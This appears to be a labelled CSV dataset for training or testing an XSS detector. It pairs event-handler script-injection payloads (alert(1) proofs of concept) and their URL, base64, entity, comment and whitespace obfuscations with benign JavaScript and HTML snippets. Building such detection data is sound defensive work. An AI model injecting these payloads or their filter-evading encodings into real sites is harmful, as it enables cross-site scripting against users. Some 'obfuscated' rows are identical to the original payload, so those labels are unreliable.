sample_id,variant_id,technique,payload_original,payload_obfuscated,label
3717,1,urlencode,"<li onmouseenter=""alert(1)"">test</li>",%3Cli%20onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,1
3717,2,double_urlencode,"<li onmouseenter=""alert(1)"">test</li>",%253Cli%2520onmouseenter%253D%2522alert%25281%2529%2522%253Etest%253C%252Fli%253E,1
3717,3,html_then_urlencode,"<li onmouseenter=""alert(1)"">test</li>",%26lt%3Bli%20onmouseenter%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fli%26gt%3B,1
3718,0,none,target.appendchild(div); return div; },target.appendchild(div); return div; },0
3719,0,none,"_addeventlisteners() { eventhandler.on(this._element, event_keydown_dismiss$1, event => { if (event.key !== escape_key$1) {","_addeventlisteners() { eventhandler.on(this._element, event_keydown_dismiss$1, event => { if (event.key !== escape_key$1) {",0
3720,1,html_entities,"<del ondblclick=""alert(1)"">test</del>",&lt;del ondblclick=&quot;alert(1)&quot;&gt;test&lt;/del&gt;,1
3720,2,urlencode,"<del ondblclick=""alert(1)"">test</del>",%3Cdel%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fdel%3E,1
3720,3,whitespace_noise,"<del ondblclick=""alert(1)"">test</del>","<del ondblclick=""alert(1)""  >test</del>",1
3721,1,whitespace_noise,<source onpointerdown=alert(1)>xss</source>,<source onpointerdown=alert(1) >xss</source>,1
3721,2,urlencode,<source onpointerdown=alert(1)>xss</source>,%3Csource%20onpointerdown%3Dalert%281%29%3Exss%3C%2Fsource%3E,1
3721,3,html_entities,<source onpointerdown=alert(1)>xss</source>,&lt;source onpointerdown=alert(1)&gt;xss&lt;/source&gt;,1
3722,0,none,const event_resize$1 = `resize${event_key$4}`,const event_resize$1 = `resize${event_key$4}`,0
3723,1,html_then_urlencode,<div ongesturestart=alert(1)>xss</div>,%26lt%3Bdiv%20ongesturestart%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fdiv%26gt%3B,1
3723,2,double_urlencode,<div ongesturestart=alert(1)>xss</div>,%253Cdiv%2520ongesturestart%253Dalert%25281%2529%253Exss%253C%252Fdiv%253E,1
3723,3,base64,<div ongesturestart=alert(1)>xss</div>,PGRpdiBvbmdlc3R1cmVzdGFydD1hbGVydCgxKT54c3M8L2Rpdj4=,1
3724,0,none,_this31._setupeventhandlers(); _this31._setupclasses(); _this31._setupfixed();,_this31._setupeventhandlers(); _this31._setupclasses(); _this31._setupfixed();,0
3725,0,none,"if (this.showindicators && this.$indicators) { this.$indicators.find('.indicator-item').each(function (el, i) { el.removeeventlistener('click', _this64._handleindicatorclickbound);","if (this.showindicators && this.$indicators) { this.$indicators.find('.indicator-item').each(function (el, i) { el.removeeventlistener('click', _this64._handleindicatorclickbound);",0
3726,0,none,"const [isdelegated, callable, typeevent] = normalizeparameters(originaltypeevent, handler, delegationfunction); const innamespace = typeevent !== originaltypeevent; const events = getelementevents(element);","const [isdelegated, callable, typeevent] = normalizeparameters(originaltypeevent, handler, delegationfunction); const innamespace = typeevent !== originaltypeevent; const events = getelementevents(element);",0
3727,0,none,value: function _setupdropdown() {,value: function _setupdropdown() {,0
3728,0,none,selectedoption[0].getboundingclientrect().top -,selectedoption[0].getboundingclientrect().top -,0
3729,1,html_entities,"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>",&lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;frame id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)&gt;&lt;/frame&gt;,1
3729,2,comment_marker,"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>","<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>",1
3729,3,whitespace_noise,"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>","<style>:target {transform: rotate(180deg);}< /style> <frame id=x style=""transition:transform 2s"" ontransitionrun= alert( 1)></frame>",1
3730,0,none,var activeindicator = this.$indicators.find('.indicator-item.active'),var activeindicator = this.$indicators.find('.indicator-item.active'),0
3731,1,html_entities,"<dt oncopy=""alert(1)"" contenteditable>test</dt>",&lt;dt oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/dt&gt;,1
3731,2,whitespace_noise,"<dt oncopy=""alert(1)"" contenteditable>test</dt>","<dt oncopy=""alert(1) "" contenteditable>test</dt> ",1
3731,3,double_urlencode,"<dt oncopy=""alert(1)"" contenteditable>test</dt>",%253Cdt%2520oncopy%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fdt%253E,1
3732,0,none,_configaftermerge(config) { config.rootelement = getelement(config.rootelement); return config;,_configaftermerge(config) { config.rootelement = getelement(config.rootelement); return config;,0
3733,1,html_entities,"<s oncopy=""alert(1)"" contenteditable>test</s>",&lt;s oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/s&gt;,1
3733,2,base64,"<s oncopy=""alert(1)"" contenteditable>test</s>",PHMgb25jb3B5PSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L3M+,1
3733,3,urlencode,"<s oncopy=""alert(1)"" contenteditable>test</s>",%3Cs%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fs%3E,1
3734,0,none,"}, getdataattribute(element, key) { return normalizedata(element.getattribute(`data-bs-${normalizedatakey(key)}`))","}, getdataattribute(element, key) { return normalizedata(element.getattribute(`data-bs-${normalizedatakey(key)}`))",0
3735,0,none,"for (const [key, value] of object.entries(this._config)) { if (this.constructor.default[key] !== value) { config[key] = value","for (const [key, value] of object.entries(this._config)) { if (this.constructor.default[key] !== value) { config[key] = value",0
3736,1,html_then_urlencode,<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,%26lt%3Boptgroup%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%26gt%3B%26lt%3B%2Foptgroup%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,1
3736,2,html_entities,<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,&lt;optgroup id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/optgroup&gt;&lt;input autofocus&gt;,1
3736,3,double_urlencode,<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,%253Coptgroup%2520id%253Dx%2520tabindex%253D1%2520onbeforedeactivate%253Dalert%25281%2529%253E%253C%252Foptgroup%253E%253Cinput%2520autofocus%253E,1
3737,0,none,if ( options.tooltips[handlenumber] !== true ) { formattedvalue = options.tooltips[handlenumber].to(unencoded[handlenumber]); },if ( options.tooltips[handlenumber] !== true ) { formattedvalue = options.tooltips[handlenumber].to(unencoded[handlenumber]); },0
3738,0,none,"k = d ? d.to.original : e,","k = d ? d.to.original : e,",0
3739,1,comment_marker,<plaintext onpointerdown=alert(1)>xss</plaintext>,<plaintext onpointerdown=alert(1)>xss</plaintext>,1
3739,2,urlencode,<plaintext onpointerdown=alert(1)>xss</plaintext>,%3Cplaintext%20onpointerdown%3Dalert%281%29%3Exss%3C%2Fplaintext%3E,1
3739,3,base64,<plaintext onpointerdown=alert(1)>xss</plaintext>,PHBsYWludGV4dCBvbnBvaW50ZXJkb3duPWFsZXJ0KDEpPnhzczwvcGxhaW50ZXh0Pg==,1
3740,0,none,this._element.remove(); this._isappended = false; },this._element.remove(); this._isappended = false; },0
3741,0,none,"this.el.addeventlistener('click', this._handlecollapsibleclickbound); this.$headers.each(function (header) { header.addeventlistener('keydown', _this4._handlecollapsiblekeydownbound);","this.el.addeventlistener('click', this._handlecollapsibleclickbound); this.$headers.each(function (header) { header.addeventlistener('keydown', _this4._handlecollapsiblekeydownbound);",0
3742,0,none,var afterread = 'afterread'; // pure-logic modifiers var beforemain = 'beforemain'; var main = 'main';,var afterread = 'afterread'; // pure-logic modifiers var beforemain = 'beforemain'; var main = 'main';,0
3743,1,urlencode,<small onpointerdown=alert(1)>xss</small>,%3Csmall%20onpointerdown%3Dalert%281%29%3Exss%3C%2Fsmall%3E,1
3743,2,whitespace_noise,<small onpointerdown=alert(1)>xss</small>,<  small onpointerdown=alert(1) >xss</small>,1
3743,3,html_then_urlencode,<small onpointerdown=alert(1)>xss</small>,%26lt%3Bsmall%20onpointerdown%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fsmall%26gt%3B,1
3744,0,none,"<div role=""navigation"" class=""navbox"" aria-labelledby=""robotics"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""3"">","<div role=""navigation"" class=""navbox"" aria-labelledby=""robotics"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""3"">",0
3745,0,none,if (value !== last) {,if (value !== last) {,0
3746,1,base64,"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48b2JqZWN0IHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbnN0YXJ0PSJhbGVydCgxKSI+PC9vYmplY3Q+,1
3746,2,html_then_urlencode,"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",%26lt%3Bstyle%26gt%3B%40keyframes%20x%7B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bobject%20style%3D%26quot%3Banimation-name%3Ax%26quot%3B%20onanimationstart%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B%26lt%3B%2Fobject%26gt%3B,1
3746,3,double_urlencode,"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Cobject%2520style%253D%2522animation-name%253Ax%2522%2520onanimationstart%253D%2522alert%25281%2529%2522%253E%253C%252Fobject%253E,1
3747,1,whitespace_noise,<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,1
3747,2,base64,<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,PHZpZGVvIGNvbnRyb2xzIHNyYz12YWxpZHZpZGVvLm1wNCBvbndlYmtpdGZ1bGxzY3JlZW5jaGFuZ2U9YWxlcnQoMSk+,1
3747,3,double_urlencode,<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,%253Cvideo%2520controls%2520src%253Dvalidvideo.mp4%2520onwebkitfullscreenchange%253Dalert%25281%2529%253E,1
3748,1,comment_marker,<keygen onpointerdown=alert(1)>xss</keygen>,<keyg/*OBF*/en onpointerdown=alert(1)>xss</key/*OBF*/gen>,1
3748,2,double_urlencode,<keygen onpointerdown=alert(1)>xss</keygen>,%253Ckeygen%2520onpointerdown%253Dalert%25281%2529%253Exss%253C%252Fkeygen%253E,1
3748,3,urlencode,<keygen onpointerdown=alert(1)>xss</keygen>,%3Ckeygen%20onpointerdown%3Dalert%281%29%3Exss%3C%2Fkeygen%3E,1
3749,0,none,function gethtmlelementscroll(element) {,function gethtmlelementscroll(element) {,0
3750,0,none,"<li id=""cite_note-society_based_learning-192""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-society_based_learning_192-0"">^ </a> </b>","<li id=""cite_note-society_based_learning-192""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-society_based_learning_192-0"">^ </a> </b>",0
3751,0,none,"var overflow = detectoverflow(state, {","var overflow = detectoverflow(state, {",0
3752,0,none,"<li><a href=""/wiki/willard_van_orman_quine"" title=""willard van orman quine"">w. v. o. quine </a> </li>","<li><a href=""/wiki/willard_van_orman_quine"" title=""willard van orman quine"">w. v. o. quine </a> </li>",0
3753,1,html_entities,<bgsound onpointerout=alert(1)>xss</bgsound>,&lt;bgsound onpointerout=alert(1)&gt;xss&lt;/bgsound&gt;,1
3753,2,comment_marker,<bgsound onpointerout=alert(1)>xss</bgsound>,<bgsound onpointerout=ale/*OBF*/rt(1)>xss</bgsound>,1
3753,3,double_urlencode,<bgsound onpointerout=alert(1)>xss</bgsound>,%253Cbgsound%2520onpointerout%253Dalert%25281%2529%253Exss%253C%252Fbgsound%253E,1
3754,1,urlencode,<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,%3Cfont%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Ffont%3E%3Cinput%20autofocus%3E,1
3754,2,base64,<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,PGZvbnQgb25mb2N1c291dD1hbGVydCgxKSB0YWJpbmRleD0xIGlkPXg+PC9mb250PjxpbnB1dCBhdXRvZm9jdXM+,1
3754,3,html_then_urlencode,<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,%26lt%3Bfont%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%26gt%3B%26lt%3B%2Ffont%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,1
3755,1,urlencode,<shadow onpointerup=alert(1)>xss</shadow>,%3Cshadow%20onpointerup%3Dalert%281%29%3Exss%3C%2Fshadow%3E,1
3755,2,html_then_urlencode,<shadow onpointerup=alert(1)>xss</shadow>,%26lt%3Bshadow%20onpointerup%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fshadow%26gt%3B,1
3755,3,comment_marker,<shadow onpointerup=alert(1)>xss</shadow>,<shadow/*OBF*/ onpointerup=alert(1)>xss</shadow>,1
3756,1,base64,"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",PHZpZGVvIGNvbnRyb2xzIGF1dG9wbGF5IG9uZW5kZWQ9YWxlcnQoMSk+PHNvdXJjZSBzcmM9InZhbGlkdmlkZW8ubXA0IiB0eXBlPSJ2aWRlby9tcDQiPjwvdmlkZW8+,1
3756,2,double_urlencode,"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",%253Cvideo%2520controls%2520autoplay%2520onended%253Dalert%25281%2529%253E%253Csource%2520src%253D%2522validvideo.mp4%2522%2520type%253D%2522video%252Fmp4%2522%253E%253C%252Fvideo%253E,1
3756,3,html_entities,"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",&lt;video controls autoplay onended=alert(1)&gt;&lt;source src=&quot;validvideo.mp4&quot; type=&quot;video/mp4&quot;&gt;&lt;/video&gt;,1
3757,0,none,} } if (verticalalignment === 'bottom') {,} } if (verticalalignment === 'bottom') {,0
3758,1,urlencode,"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",%3Cbig%20onbeforepaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fbig%3E,1
3758,2,comment_marker,"<big onbeforepaste=""alert(1)"" contenteditable>test</big>","<big onbeforepaste=""alert(1)"" contenteditable>test</big>",1
3758,3,base64,"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",PGJpZyBvbmJlZm9yZXBhc3RlPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2JpZz4=,1
3759,1,base64,<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>,PGRpciBvbmJsdXI9YWxlcnQoMSkgdGFiaW5kZXg9MSBpZD14PjwvZGlyPjxpbnB1dCBhdXRvZm9jdXM+,1
3759,2,html_then_urlencode,<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>,%26lt%3Bdir%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%26gt%3B%26lt%3B%2Fdir%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,1
3759,3,html_entities,<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>,&lt;dir onblur=alert(1) tabindex=1 id=x&gt;&lt;/dir&gt;&lt;input autofocus&gt;,1
3760,1,html_entities,<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,&lt;isindex id=x tabindex=1 onactivate=alert(1)&gt;&lt;/isindex&gt;,1
3760,2,urlencode,<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,%3Cisindex%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C%2Fisindex%3E,1
3760,3,whitespace_noise,<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,<isindex id=x tabindex=1 onactivate=alert(1)  ></isindex>  ,1
3761,1,comment_marker,<track onpointerleave=alert(1)>xss</track>,<trac/*OBF*/k on/*OBF*/pointerleave=alert(1)>xss</t/*OBF*/rack>,1
3761,2,html_entities,<track onpointerleave=alert(1)>xss</track>,&lt;track onpointerleave=alert(1)&gt;xss&lt;/track&gt;,1
3761,3,whitespace_noise,<track onpointerleave=alert(1)>xss</track>,<track onpointerleave=  alert(1) >xss< /track>,1
3762,0,none,"window.addeventlistener('domcontentloaded', () => { showactivetheme(getpreferredtheme()) document.queryselectorall('[data-bs-theme-value]')","window.addeventlistener('domcontentloaded', () => { showactivetheme(getpreferredtheme()) document.queryselectorall('[data-bs-theme-value]')",0
3763,0,none,this._handlerangeblurmouseouttouchleavebound = this._handlerangeblurmouseouttouchleave.bind( this );,this._handlerangeblurmouseouttouchleavebound = this._handlerangeblurmouseouttouchleave.bind( this );,0
3764,0,none,"arr.push('<option value=""' + (year === refyear ? i - c : 12 + i - c) + '""' + (i === month ? ' selected=""selected""' : '') + (isminyear && i < opts.minmonth || ismaxyear && i > opts.maxmonth ? 'disabled=""disabled""' : '') + '>' + opts.i18n.months[i] + '</option>')","arr.push('<option value=""' + (year === refyear ? i - c : 12 + i - c) + '""' + (i === month ? ' selected=""selected""' : '') + (isminyear && i < opts.minmonth || ismaxyear && i > opts.maxmonth ? 'disabled=""disabled""' : '') + '>' + opts.i18n.months[i] + '</option>')",0
3765,1,urlencode,"<table onmousemove=""alert(1)"">test</table>",%3Ctable%20onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ftable%3E,1
3765,2,html_entities,"<table onmousemove=""alert(1)"">test</table>",&lt;table onmousemove=&quot;alert(1)&quot;&gt;test&lt;/table&gt;,1
3765,3,html_then_urlencode,"<table onmousemove=""alert(1)"">test</table>",%26lt%3Btable%20onmousemove%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Ftable%26gt%3B,1
3766,0,none,const event_pointerdown = `pointerdown${event_key$9}`,const event_pointerdown = `pointerdown${event_key$9}`,0
3767,0,none,const innamespace = event !== typeevent; let jqueryevent = null; let bubbles = true;,const innamespace = event !== typeevent; let jqueryevent = null; let bubbles = true;,0
3768,0,none,for ( var key in options.cssclasses ) {,for ( var key in options.cssclasses ) {,0
3769,0,none,if ($collapsibleli.length) {,if ($collapsibleli.length) {,0
3770,0,none,"this._putelementintemplate(getelement(content), templateelement)","this._putelementintemplate(getelement(content), templateelement)",0
3771,0,none,"handlenumbers.foreach(function(handlenumber){ fireevent('update', handlenumber); fireevent('slide', handlenumber);","handlenumbers.foreach(function(handlenumber){ fireevent('update', handlenumber); fireevent('slide', handlenumber);",0
3772,0,none,grunt.loadnpmtasks('grunt-sass'); grunt.loadnpmtasks('grunt-contrib-concat'); grunt.loadnpmtasks('grunt-contrib-uglify');,grunt.loadnpmtasks('grunt-sass'); grunt.loadnpmtasks('grunt-contrib-concat'); grunt.loadnpmtasks('grunt-contrib-uglify');,0
3773,1,html_entities,<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,&lt;iframe id=x tabindex=1 ondeactivate=alert(1)&gt;&lt;/iframe&gt;&lt;input id=y autofocus&gt;,1
3773,2,base64,<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,PGlmcmFtZSBpZD14IHRhYmluZGV4PTEgb25kZWFjdGl2YXRlPWFsZXJ0KDEpPjwvaWZyYW1lPjxpbnB1dCBpZD15IGF1dG9mb2N1cz4=,1
3773,3,double_urlencode,<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,%253Ciframe%2520id%253Dx%2520tabindex%253D1%2520ondeactivate%253Dalert%25281%2529%253E%253C%252Fiframe%253E%253Cinput%2520id%253Dy%2520autofocus%253E,1
3774,1,urlencode,"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>",%3Cvideo%20autoplay%20onloadedmetadata%3Dalert%281%29%3E%20%3Csource%20src%3D%22validvideo.mp4%22%20type%3D%22video%2Fmp4%22%3E%3C%2Fvideo%3E,1
3774,2,html_entities,"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>",&lt;video autoplay onloadedmetadata=alert(1)&gt; &lt;source src=&quot;validvideo.mp4&quot; type=&quot;video/mp4&quot;&gt;&lt;/video&gt;,1
3774,3,base64,"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>",PHZpZGVvIGF1dG9wbGF5IG9ubG9hZGVkbWV0YWRhdGE9YWxlcnQoMSk+IDxzb3VyY2Ugc3JjPSJ2YWxpZHZpZGVvLm1wNCIgdHlwZT0idmlkZW8vbXA0Ij48L3ZpZGVvPg==,1
3775,1,html_then_urlencode,<li onpointerup=alert(1)>xss</li>,%26lt%3Bli%20onpointerup%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fli%26gt%3B,1
3775,2,urlencode,<li onpointerup=alert(1)>xss</li>,%3Cli%20onpointerup%3Dalert%281%29%3Exss%3C%2Fli%3E,1
3775,3,double_urlencode,<li onpointerup=alert(1)>xss</li>,%253Cli%2520onpointerup%253Dalert%25281%2529%253Exss%253C%252Fli%253E,1
3776,0,none,return domelem.m_pushpin,return domelem.m_pushpin,0
3777,1,html_entities,"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;dt style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;&gt;&lt;/dt&gt;,1
3777,2,html_then_urlencode,"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",%26lt%3Bstyle%26gt%3B%40keyframes%20slidein%20%7B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bdt%20style%3D%26quot%3Banimation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%26quot%3B%20onanimationiteration%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B%26lt%3B%2Fdt%26gt%3B,1
3777,3,comment_marker,"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>","<sty/*OBF*/le>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",1
3778,0,none,extras: { files: { 'extras/nouislider/nouislider.min.js': ['extras/nouislider/nouislider.js'],extras: { files: { 'extras/nouislider/nouislider.min.js': ['extras/nouislider/nouislider.js'],0
3779,1,html_entities,"<style>@keyframes slidein {}</style><multicol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></multicol>",&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;multicol style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;&gt;&lt;/multicol&gt;,1
3779,2,double_urlencode,"<style>@keyframes slidein {}</style><multicol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></multicol>",%253Cstyle%253E%2540keyframes%2520slidein%2520%257B%257D%253C%252Fstyle%253E%253Cmulticol%2520style%253D%2522animation-duration%253A1s%253Banimation-name%253Aslidein%253Banimation-iteration-count%253A2%2522%2520onanimationiteration%253D%2522alert%25281%2529%2522%253E%253C%252Fmulticol%253E,1
3779,3,whitespace_noise,"<style>@keyframes slidein {}</style><multicol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></multicol>","<style>@keyframes slidein {}</style>< multicol style=""animation- duration:  1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></multicol>",1
3780,1,html_entities,<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,&lt;xmp id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/xmp&gt;&lt;input autofocus&gt;,1
3780,2,urlencode,<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,%3Cxmp%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Fxmp%3E%3Cinput%20autofocus%3E,1
3780,3,html_then_urlencode,<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,%26lt%3Bxmp%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%26gt%3B%26lt%3B%2Fxmp%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,1
3781,0,none,for (var index = 0; index < state.orderedmodifiers.length; index++) { if (state.reset === true) { state.reset = false;,for (var index = 0; index < state.orderedmodifiers.length; index++) { if (state.reset === true) { state.reset = false;,0
3782,0,none,g.autoplay && g.play(),g.autoplay && g.play(),0
3783,0,none,"'dropdown.js', 'modal.js', 'materialbox.js',","'dropdown.js', 'modal.js', 'materialbox.js',",0
3784,0,none,const height = observablesection.offsettop - this._element.offsettop,const height = observablesection.offsettop - this._element.offsettop,0
3785,1,comment_marker,"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>","<style>@keyframes x{}</style><address style=""animation-name:x"" o/*OBF*/nanimation/*OBF*/start=""alert(1)""></address>",1
3785,2,base64,"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48YWRkcmVzcyBzdHlsZT0iYW5pbWF0aW9uLW5hbWU6eCIgb25hbmltYXRpb25zdGFydD0iYWxlcnQoMSkiPjwvYWRkcmVzcz4=,1
3785,3,double_urlencode,"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>",%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Caddress%2520style%253D%2522animation-name%253Ax%2522%2520onanimationstart%253D%2522alert%25281%2529%2522%253E%253C%252Faddress%253E,1
3786,1,urlencode,<rtc onpointerdown=alert(1)>xss</rtc>,%3Crtc%20onpointerdown%3Dalert%281%29%3Exss%3C%2Frtc%3E,1
3786,2,base64,<rtc onpointerdown=alert(1)>xss</rtc>,PHJ0YyBvbnBvaW50ZXJkb3duPWFsZXJ0KDEpPnhzczwvcnRjPg==,1
3786,3,html_then_urlencode,<rtc onpointerdown=alert(1)>xss</rtc>,%26lt%3Brtc%20onpointerdown%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Frtc%26gt%3B,1
3787,0,none,dispose() { if (this._popper) { this._popper.destroy(),dispose() { if (this._popper) { this._popper.destroy(),0
